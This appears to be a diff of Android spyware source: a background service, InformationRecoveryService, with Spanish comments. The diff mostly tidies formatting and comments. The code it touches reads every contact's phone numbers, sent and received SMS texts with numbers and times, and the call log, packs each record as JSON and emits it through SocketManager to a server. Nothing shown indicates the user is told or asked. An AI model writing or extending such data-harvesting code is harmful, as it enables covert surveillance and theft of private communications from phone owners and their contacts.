@@ -50,15 +50,13 @@ public class InformationRecoveryService extends Service {
 
 
     String convertir_fecha(long i)    {
-        SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
+        SimpleDateFormat formatter = new SimpleDateFormat("MM-dd-yyyy HH:mm");
         String fecha = formatter.format(new Date(i));
         return fecha;
     }
 
     void recuperar_contactos() {
 
-        String phoneNumber = null;
-        String name = null;
         Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
         String _ID = ContactsContract.Contacts._ID;
         String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
@@ -68,28 +66,21 @@ public class InformationRecoveryService extends Service {
         String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
         String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
 
-        StringBuffer output = new StringBuffer();
-
         ContentResolver contentResolver = getContentResolver();
-
         Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);
 
         // lista todos los contactos del telefono
         if (cursor.getCount() > 0) {
 
             while (cursor.moveToNext()) {
-
                 String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
-
                 int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));
                 //lista solo los q tienen numero de telefono
                 if (hasPhoneNumber > 0) {
 
-                    //  output.append("\n nombre:" + name);
-
                     // consulta q relaciona contactos con telefono con los detalles de sus telefonos
-                    Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id },  null);
-
+                    Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null,
+                            Phone_CONTACT_ID + " = ?", new String[] { contact_id },  null);
 
                     while (phoneCursor.moveToNext()) {
                         ////////////////////////////////informacion para el servidor/////////////////////////////7
@@ -104,42 +95,31 @@ public class InformationRecoveryService extends Service {
                         } catch (JSONException e) {
                             e.printStackTrace();
                         }
-
                         SocketManager.emitContacts(contact);
                         ////////////////////////////////////////////////////////////////////////////////////////////
-
                     }
                     phoneCursor.close();
                 }
             }
-            //txtResultados.setText(output);
         }
     }
 
     ///////////////////////mensajes salientes//////////////////////
     void recuperar_enviados() {
-        // uri de los mensajes enviados
-        Uri enviadosURI = Uri.parse("content://sms/sent");
 
-// columnas para las consultas
-        String[] reqCols = new String[]{"_id", "address", "body", "date"};
-
-// resolver q para interactuar con el provider
-        ContentResolver cr = getContentResolver();
-
-// cursor para los mensajes
-        Cursor c = cr.query(enviadosURI, reqCols, null, null, null);
+        Uri enviadosURI = Uri.parse("content://sms/sent");                  // uri de los mensajes enviados
+        String[] reqCols = new String[]{"_id", "address", "body", "date"};  // columnas para las consultas
+        ContentResolver cr = getContentResolver();                          // resolver q para interactuar con el provider
+        Cursor c = cr.query(enviadosURI, reqCols, null, null, null);        // cursor para los mensajes
 
         if (c.moveToFirst()) {
             String telefono;
             String mensaje;
             String hora;
-
             int colnumero = c.getColumnIndex("address");
             int colmensaje = c.getColumnIndex(Sms.BODY);
             int colHora = c.getColumnIndex(Sms.DATE);
 
-            //txtResultados.setText("");
             do {
                 ////////////////////////// datos para el servidor/////////////////////
                 mensaje = c.getString(colmensaje);
@@ -147,9 +127,7 @@ public class InformationRecoveryService extends Service {
                 hora =  convertir_fecha(c.getLong(colHora));
 
                 JSONObject sent = new JSONObject();
-
                 try {
-
                     sent.put("sms", mensaje);
                     sent.put("num", telefono);
                     sent.put("time", hora);
@@ -159,42 +137,26 @@ public class InformationRecoveryService extends Service {
                     Utils.log(TAG, "time" + hora);
                     Utils.log(TAG, "type" + "enviado");
 
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-
+                } catch (JSONException e) {   e.printStackTrace();         }
                 SocketManager.emitMsjs(sent);
-
                 /////////////////////////// //////////////////////////////////////////
-                //txtResultados.append(telefono + " - " + mensaje + " - " + hora + "\n");
             } while (c.moveToNext());
         }
     }
 ///////////////////////mensajes entrantes////////////////////////////////
     void recuperar_inbox() {
-
-        // URI de la imbox
-        Uri inboxURI = Uri.parse("content://sms/inbox");
-
-// columnas para las consultas
-        String[] reqCols = new String[]{"_id", "address", "body", "date"};
-
-// resolver q interactua con el provider
-        ContentResolver cr = getContentResolver();
-
-// cursor para el inbox
-        Cursor c = cr.query(inboxURI, reqCols, null, null, null);
+        Uri inboxURI = Uri.parse("content://sms/inbox");                    // URI de la imbox
+        String[] reqCols = new String[]{"_id", "address", "body", "date"};  // columnas para las consultas
+        ContentResolver cr = getContentResolver();                          // resolver q interactua con el provider
+        Cursor c = cr.query(inboxURI, reqCols, null, null, null);           // cursor para el inbox
 
         if (c.moveToFirst()) {
             String telefono;
             String mensaje;
             String hora;
-
             int colnumero = c.getColumnIndex("address");
             int colmensaje = c.getColumnIndex(Sms.BODY);
             int colHora = c.getColumnIndex(Sms.DATE);
-
-            //txtResultados.setText("");
 
             do {
                 ////////////////////////// datos para el servidor/////////////////////
@@ -203,7 +165,6 @@ public class InformationRecoveryService extends Service {
                 hora =  convertir_fecha(c.getLong(colHora));
 
                 JSONObject recieved = new JSONObject();
-
                 try {
 
                     recieved.put("sms", mensaje);
@@ -213,15 +174,11 @@ public class InformationRecoveryService extends Service {
                     Utils.log(TAG, "sms" + mensaje);
                     Utils.log(TAG, "num" + telefono);
                     Utils.log(TAG, "time" + hora);
-                    Utils.log(TAG, "type" + "enviado");
+                    Utils.log(TAG, "type" + "recibido");
 
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
+                } catch (JSONException e) {   e.printStackTrace();          }
                 SocketManager.emitMsjs(recieved);
-
                 /////////////////////////// //////////////////////////////////////////
-                //txtResultados.append(telefono + " - " + mensaje + " - " + hora + "\n");
             } while (c.moveToNext());
         }
     }
@@ -229,24 +186,16 @@ public class InformationRecoveryService extends Service {
 
     void recuperar_llamadas() {
 
-        //uri para las llamadas
-        Uri llamadasUri = Calls.CONTENT_URI;
-        //columnas para las consultas
+
+        Uri llamadasUri = Calls.CONTENT_URI;        //uri para las llamadas
         String[] projection = new String[]{
                 Calls.TYPE,
-                Calls.NUMBER,
+                Calls.NUMBER,                       //columnas para las consultas
                 Calls.DATE};
-        //resolver que interactua con el provider
-        ContentResolver cr = getContentResolver();
+
+        ContentResolver cr = getContentResolver();  //resolver que interactua con el provider
 
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-            // TODO: Consider calling
-            //    ActivityCompat#requestPermissions
-            // here to request the missing permissions, and then overriding
-            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-            //                                          int[] grantResults)
-            // to handle the case where the user grants the permission. See the documentation
-            // for ActivityCompat#requestPermissions for more details.
             return;
         }
         //cursor para las llamadas
@@ -265,8 +214,6 @@ public class InformationRecoveryService extends Service {
             int colTipo = cur.getColumnIndex(Calls.TYPE);
             int colTelefono = cur.getColumnIndex(Calls.NUMBER);
             int colHora = cur.getColumnIndex(Calls.DATE);
-            //txtResultados.setText("");
-
             do {
                 tipo = cur.getInt(colTipo);
                 //////////////////////////datos para el servidor///////////////////////
@@ -281,22 +228,16 @@ public class InformationRecoveryService extends Service {
                     tipoLlamada = "PERDIDA";
 
                 JSONObject call = new JSONObject();
-
                 try {
-
                     call.put("type", tipoLlamada);
                     call.put("event", telefono);
                     Utils.log(TAG, "num" + telefono);
                     Utils.log(TAG, "type" + tipoLlamada);
 
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
+                } catch (JSONException e) {   e.printStackTrace();         }
 
                 SocketManager.emitCalls(call);
                 ////////////////////////////////////////////////////////////////////////
-                //txtResultados.append(tipoLlamada + " - " + telefono +" - "+ hora + "\n");
-
             } while (cur.moveToPrevious());
         }
     }
